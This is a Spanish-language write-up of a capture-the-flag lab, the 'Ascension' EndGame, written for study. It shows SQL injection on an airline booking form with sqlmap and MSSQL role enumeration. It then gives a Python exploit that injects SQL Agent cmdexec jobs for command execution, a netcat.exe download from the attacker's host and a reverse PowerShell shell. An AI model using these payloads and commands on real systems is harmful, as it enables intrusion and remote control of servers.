---
title: "EndGame - Ascension"
excerpt: "Se realizará un WriteUp del EndGame retirado Ascension que cuenta con máquinas Windows. Desarrollaremos cada una paso a paso con el fin de entender y profundizar en nuevos conceptos."
header:
  teaser: "/assets/images/image.png"
categories:
  - WriteUp
---

<style>
  .teaser-img {
    width: auto; /* Ancho ajustado automáticamente */
    height: 100px; /* Altura de la imagen */
    max-width: 600%; /* Ancho máximo deseado */
    /* Puedes agregar más estilos si es necesario */
  }
</style>

<!-- Puedes usar HTML para la imagen y agregar una clase -->
<img src="{{ page.header.teaser }}" alt="Teaser image" class="teaser-img">

De comienzo tenemos la siguiente información:
```
Ascensión
Por egre55 y TRX

Daedalus Airlines se está convirtiendo rápidamente en un actor importante en la aviación mundial.

El ritmo de crecimiento ha hecho que la empresa haya acumulado mucha deuda técnica. Para evitar una violación de datos y poner en riesgo su cadena de suministro, Daedalus ha contratado a su empresa de seguridad cibernética para probar sus sistemas.

Ascension está diseñado para poner a prueba sus habilidades en enumeración, explotación, pivotación, recorrido de bosque y escalada de privilegios dentro de dos pequeñas redes de Active Directory.

El objetivo es obtener acceso al socio de confianza, moverse a través de la red y comprometer dos bosques de Active Directory mientras recopila varias banderas en el camino. ¿Puedes Ascender?

Punto de entrada: 10.13.38.20
```

Además sabemos que consta de las siguientes maquinas a tener en cuenta:

![](/assets/images/image-1.png)

La exploración inicial de la máquina mediante la herramienta Nmap reveló que solo un puerto se encontraba activo, específicamente el puerto 80, el cual estaba asociado con un servicio web bajo el protocolo HTTP.

Tras identificar el servicio web, procedimos a examinar su contenido, el cual se asemejaba a una página perteneciente a una aerolínea. En dicho sitio, localizamos un botón destinado a la reserva de vuelos.

Al acceder a la página de reservas, se nos permitió ingresar datos relacionados con posibles vuelos. Durante la prueba de entrada de datos, al insertar una comilla simple ('), se generó un error atribuido al sistema de gestión de bases de datos MS SQL. Esta situación sugiere la posibilidad de una vulnerabilidad por inyección SQL, la cual podría ser explotada aprovechando dicho error.

Con el fin de optimizar el proceso y ahorrar tiempo, decidimos emplear la herramienta SQLmap. Inicializamos el escaneo proporcionándole la información relativa al campo que mostró la vulnerabilidad. Utilizando el parámetro "-dbs", procedimos a extraer los nombres de todas las bases de datos disponibles. No obstante, la exploración no arrojó resultados de particular relevancia en dichas bases de datos.

```bash
❯ sqlmap --batch --url http://10.13.38.20/book-trip.php --data "destination=test" -dbs
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.8#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[18:18:36] [INFO] resuming back-end DBMS 'microsoft sql server' 
[18:18:36] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: destination (POST)
    Type: error-based
    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)
    Payload: destination=test' AND 5908 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(107)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (5908=5908) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(106)+CHAR(98)+CHAR(106)+CHAR(113)))-- OSNd  

    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: destination=test';WAITFOR DELAY '0:0:5'--

    Type: time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind (IF)
    Payload: destination=test' WAITFOR DELAY '0:0:5'-- DCiP
---
[18:18:37] [INFO] the back-end DBMS is Microsoft SQL Server
[18:18:37] [INFO] fetching database names
[18:18:38] [INFO] retrieved: 'daedalus'
[18:18:39] [INFO] retrieved: 'logs'
[18:18:39] [INFO] retrieved: 'master'
[18:18:40] [INFO] retrieved: 'model'
[18:18:40] [INFO] retrieved: 'msdb'
[18:18:41] [INFO] retrieved: 'tempdb'
available databases [6]:
[*] daedalus
[*] logs
[*] master
[*] model
[*] msdb
[*] tempdb
```

  
Mediante el parámetro "--users" de SQLmap, es posible extraer los usuarios asociados a la base de datos, permitiéndonos así obtener información adicional relevante.

Además, para ejecutar consultas personalizadas y tener un mayor control sobre las operaciones realizadas, optaremos por utilizar el parámetro "--sql-shell". Este parámetro nos proporcionará una interfaz de consola que nos permitirá enviar consultas SQL de manera directa, brindando así un mayor nivel de control sobre las acciones ejecutadas en el sistema de gestión de bases de datos

```bash
❯ sqlmap --batch --url http://10.13.38.20/book-trip.php --data "destination=test" --users  
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.8#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[14:24:47] [INFO] resuming back-end DBMS 'microsoft sql server' 
[14:24:47] [INFO] testing connection to the target URL
[14:24:48] [INFO] the back-end DBMS is Microsoft SQL Server
[14:24:48] [INFO] fetching database user'
database management system users [18]:
[*] ##MS_AgentSigningCertificate##
[*] ##MS_PolicyEventProcessingLogin##
[*] ##MS_PolicySigningCertificate##
[*] ##MS_PolicyTsqlExecutionLogin##
[*] ##MS_SmoExtendedSigningCertificate##
[*] ##MS_SQLAuthenticatorCertificate##
[*] ##MS_SQLReplicationSigningCertificate##
[*] ##MS_SQLResourceSigningCertificate##
[*] daedalus
[*] daedalus_admin
[*] NT AUTHORITY\\SYSTEM
[*] NT Service\\MSSQLSERVER
[*] NT SERVICE\\SQLSERVERAGENT
[*] NT SERVICE\\SQLTELEMETRY
[*] NT SERVICE\\SQLWriter
[*] NT SERVICE\\Winmgmt
[*] sa
[*] WEB01\\svc_dev
```

```bash
❯ sqlmap --batch --url http://10.13.38.20/book-trip.php --data "destination=test" --sql-shell
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.8#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[18:19:09] [INFO] resuming back-end DBMS 'microsoft sql server' 
[18:19:09] [INFO] testing connection to the target URL
[18:19:10] [INFO] the back-end DBMS is Microsoft SQL Server
[18:19:10] [INFO] calling Microsoft SQL Server shell. To quit type 'x' or 'q' and press ENTER  
sql-shell> select suser_name();
[18:22:19] [INFO] fetching SQL SELECT statement query output: 'select suser_name()'
[18:22:20] [INFO] retrieved: 'daedalus'
select suser_name(): 'daedalus'
sql-shell> host_name();
[18:25:12] [INFO] fetching SQL query output: 'host_name()'
[18:25:12] [INFO] retrieved: 'WEB01'
host_name(): 'WEB01'
sql-shell>
```

Después de crear la tabla "roles" con las columnas "username" y "rolename", procedimos a ingresar los nombres y roles de los miembros de la base de datos, siguiendo la documentación relevante. Una vez completada esta tarea, realizamos un volcado de la tabla "roles" para examinar la información obtenida.

Durante la inspección de los datos, identificamos a "daedalus_admin" con el rol "SQLAgentUserRole". Según la documentación pertinente, este rol confiere al usuario la capacidad de crear y ejecutar trabajos dentro del sistema.

```sql
sql-shell> create table roles ([username] sysname, [rolename] sysname)
[14:35:33] [INFO] executing SQL data definition statement: 'create table roles ([username] sysname, [rolename] sysname)'
create table roles ([username] sysname, [rolename] sysname): 'NULL'
sql-shell> insert into roles (username, rolename) select isnull (dp1.name, 'no members') as databaseusername, dp2.name as databaserolename from msdb.sys.database_role_members as drm left outer join msdb.sys.database_principals as dp1 on drm.member_principal_id = dp1.principal_id right outer join msdb.sys.database_principals as dp2 on drm.role_principal_id = dp2.principal_id where dp2.type = 'r' order by dp1.name
[14:35:34] [INFO] executing SQL data manipulation statement: 'insert into roles (username, rolename) select isnull (dp1.name, 'no members') as databaseusername, dp2.name as databaserolename from msdb.sys.database_role_members as drm left outer join msdb.sys.database_principals as dp1 on drm.member_principal_id = dp1.principal_id right outer join msdb.sys.database_principals as dp2 on drm.role_principal_id = dp2.principal_id where dp2.type = 'r' order by dp1.name'  
insert into roles (username, rolename) select isnull (dp1.name, 'no members') as databaseusername, dp2.name as databaserolename from msdb.sys.database_role_members as drm left outer join msdb.sys.database_principals as dp1 on drm.member_principal_id = dp1.principal_id right outer join msdb.sys.database_principals as dp2 on drm.role_principal_id = dp2.principal_id where dp2.type = 'r' order by dp1.name: 'NULL'
sql-s
```

Tras completar la inserción de datos en la tabla "roles", procedimos a realizar un volcado de la misma para examinar su contenido. Durante este proceso de revisión, identificamos que el usuario "daedalus_admin" estaba asociado al rol "SQLAgentUserRole". De acuerdo con la documentación relevante, este rol otorga al usuario la capacidad de crear y ejecutar trabajos (jobs) dentro del sistema de gestión de bases de datos.

```bash
❯ sqlmap --batch --url http://10.13.38.20/book-trip.php --data "destination=test" -D daedalus -T roles -dump  
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.8#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

Database: daedalus
Table: roles
[39 entries]
+------------------------------+-----------------------------------+
| rolename                     | username                          |
+------------------------------+-----------------------------------+
| public                       | No members                        |
| TargetServersRole            | No members                        |
| SQLAgentUserRole             | SQLAgentReaderRole                |
| SQLAgentUserRole             | dc_operator                       |
| SQLAgentUserRole             | MS_DataCollectorInternalUser      |
| SQLAgentUserRole             | daedalus_admin                    |
| SQLAgentUserRole             | WEB01\\svc_dev                    |
| SQLAgentReaderRole           | SQLAgentOperatorRole              |
| SQLAgentReaderRole           | daedalus_admin                    |
| SQLAgentReaderRole           | WEB01\\svc_dev                    |
| SQLAgentOperatorRole         | PolicyAdministratorRole           |
| SQLAgentOperatorRole         | daedalus_admin                    |
| SQLAgentOperatorRole         | WEB01\\svc_dev                    |
| DatabaseMailUserRole         | No members                        |
| db_ssisadmin                 | No members                        |
| db_ssisltduser               | dc_operator                       |
| db_ssisltduser               | dc_proxy                          |
| db_ssisoperator              | dc_operator                       |
| db_ssisoperator              | dc_proxy                          |
| db_ssisoperator              | MS_DataCollectorInternalUser      |
| dc_operator                  | dc_admin                          |
| dc_admin                     | MS_DataCollectorInternalUser      |
| dc_proxy                     | No members                        |
| PolicyAdministratorRole      | ##MS_PolicyEventProcessingLogin## |
| PolicyAdministratorRole      | ##MS_PolicyTsqlExecutionLogin##   |
| ServerGroupAdministratorRole | No members                        |
| ServerGroupReaderRole        | ServerGroupAdministratorRole      |
| UtilityCMRReader             | No members                        |
| UtilityIMRWriter             | No members                        |
| UtilityIMRReader             | UtilityIMRWriter                  |
| db_owner                     | dbo                               |
| db_accessadmin               | No members                        |
| db_securityadmin             | No members                        |
| db_ddladmin                  | No members                        |
| db_backupoperator            | No members                        |
| db_datareader                | No members                        |
| db_datawriter                | No members                        |
| db_denydatareader            | No members                        |
| db_denydatawriter            | No members                        |
+------------------------------+-----------------------------------+
```
  
Para enumerar los usuarios a los que nuestro usuario actual puede suplantar, llevaremos a cabo la creación de una tabla llamada "grants", en la cual almacenaremos los nombres de usuario pertinentes. Este proceso puede ser facilitado utilizando un artículo que nos proporciona una guía detallada sobre la enumeración de usuarios a suplantar.

```sql
sql-shell> create table grants (username varchar(1024))
[14:39:19] [INFO] executing SQL data definition statement: 'create table grants (username varchar(1024))'
create table grants (username varchar(1024)): 'NULL'
sql-shell> insert into grants (username) select distinct b.name from sys.server_permissions a inner join sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = 'impersonate'
[14:39:30] [INFO] executing SQL data manipulation statement: 'insert into grants (username) select distinct b.name from sys.server_permissions a inner join sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = 'impersonate''  
insert into grants (username) select distinct b.name from sys.server_permissions a inner join sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = 'impersonate': 'NULL'
```

Luego de realizar el volcado de la tabla "proxy", pudimos identificar las credenciales de "svc_dev", que en su descripción indicaban tener acceso para ejecutar "CmdExec" y "Powershell". Con base en esta investigación, podemos elaborar un pequeño script en Python que automatice la ejecución de comandos exclusivamente a través de trabajos (jobs), aprovechando los privilegios del usuario "daedalus_admin" que hemos suplantado.

```bash
❯ sqlmap --batch --url http://10.13.38.20/book-trip.php --data "destination=test" -D daedalus -T proxy -dump
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.8#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

Database: daedalus
Table: proxy
[1 entry]
+----------+-------------------+---------------+---------+---------+-------------------------------------------------------------+---------------------+----------------------------+
| proxy_id | user_sid          | credential_id | name    | enabled | description                                                 | credential_identity | credential_identity_exists |
+----------+-------------------+---------------+---------+---------+-------------------------------------------------------------+---------------------+----------------------------+
| 1        | ?..?\x15.???????. | 65537         | svc_dev | 1       | Allow user to access the CmdExec and Powershell subsystems. | WEB01\\svc_dev      | 1                          |
+----------+-------------------+---------------+---------+---------+-------------------------------------------------------------+---------------------+----------------------------+  
```

```python
#!/usr/bin/python3
# Shebang: indica al sistema operativo que este script debe ser ejecutado utilizando Python 3

import sys, random, string, requests
# Importación de los módulos necesarios: sys para interactuar con el intérprete de Python,
# random para generar valores aleatorios,
# string para operaciones de cadena y
# requests para realizar solicitudes HTTP.

if len(sys.argv) < 2:
    # Verifica si se proporciona al menos un argumento en la línea de comandos al ejecutar el script.
    print(f"Usage: python3 {sys.argv[0]} <command>")
    sys.exit(1)  # Sale del script con un código de salida 1 (indicando un error).

command = sys.argv[1]
# Obtiene el comando que se pasó como argumento al script.

target = "http://10.13.38.20/book-trip.php"
# Establece el objetivo al que se realizarán las solicitudes. Parece ser una URL.

name = "".join(random.choices(string.ascii_lowercase, k=8))
# Genera un nombre aleatorio de 8 caracteres utilizando letras minúsculas del alfabeto inglés.

query = f"""
use msdb;
exec as login = N'daedalus_admin';
exec msdb.dbo.sp_add_job @job_name = N'{name}_job';
exec msdb.dbo.sp_add_jobstep @job_name = N'{name}_job', @step_name = N'{name}_step', @subsystem = N'cmdexec', @command = N'C:\\Windows\\System32\\cmd.exe /c {command}', @retry_attempts = 1, @retry_interval = 5, @proxy_id = 1;  
exec msdb.dbo.sp_add_jobserver @job_name = N'{name}_job';
exec msdb.dbo.sp_start_job @job_name = N'{name}_job';
"""
# Construye una consulta SQL para ejecutar en la base de datos del destino.
# La consulta parece estar diseñada para agregar un trabajo (job) en la base de datos MSDB de SQL Server,
# con el objetivo de ejecutar un comando proporcionado como argumento.

data = {"destination": f"'; {query}-- -"}
# Construye un diccionario con una clave "destination" y un valor que parece ser una inyección SQL.
# La parte interesante aquí es que la inyección SQL se hace utilizando el valor de query,
# que es el comando construido anteriormente.
# El --; - al final es para comentar el resto de la consulta SQL original y evitar errores.

requests.post(target, data=data)
# Realiza una solicitud HTTP POST al objetivo con los datos proporcionados.
```

Vamos a realizar una comprobación. 

```bash
❯ python3 exploit.py 'curl 10.10.14.6'  
```

```bash
❯ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  
10.13.38.20 - - "GET / HTTP/1.1" 200 -
```

  
Nuestro objetivo es obtener acceso al sistema. Para lograrlo, comenzamos descargando el ejecutable netcat.exe en la ubicación C:\ProgramData, la cual es una ruta que todos los usuarios tienen permisos de escritura.

Utilizamos un script en Python llamado exploit.py para realizar la descarga del netcat.exe. Este script utiliza el comando curl para descargar el archivo desde una ubicación remota (10.10.14.10/netcat.exe) y lo guarda en C:\ProgramData\netcat.exe en el sistema comprometido.

Posteriormente, configuramos un servidor HTTP local utilizando el comando sudo python3 -m http.server 80 para servir el archivo netcat.exe.

Una vez que el archivo netcat.exe fue descargado con éxito en el sistema comprometido, procedimos a llamar a netcat.exe y establecer una conexión utilizando PowerShell. Esta conexión fue recibida en la máquina web01, utilizando las credenciales del usuario svc_dev. Como resultado, pudimos acceder y leer la primera flag.

```bash
❯ python3 exploit.py 'curl 10.10.14.6/netcat.exe -o C:\ProgramData\netcat.exe'  
```

```bash
❯ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  
10.13.38.20 - - "GET /netcat.exe HTTP/1.1" 200 -
```

```bash
❯ python3 exploit.py 'cmd /c C:\ProgramData\netcat.exe -e powershell 10.10.14.10 443'  
```

```bash
❯ sudo netcat -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.13.38.20
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.  

PS C:\Windows\System32> whoami
web01\svc_dev
PS C:\Windows\System32> type C:\Users\svc_dev\Desktop\flag.txt  
ASCENSION{********************}
PS C:\Windows\System32>
```
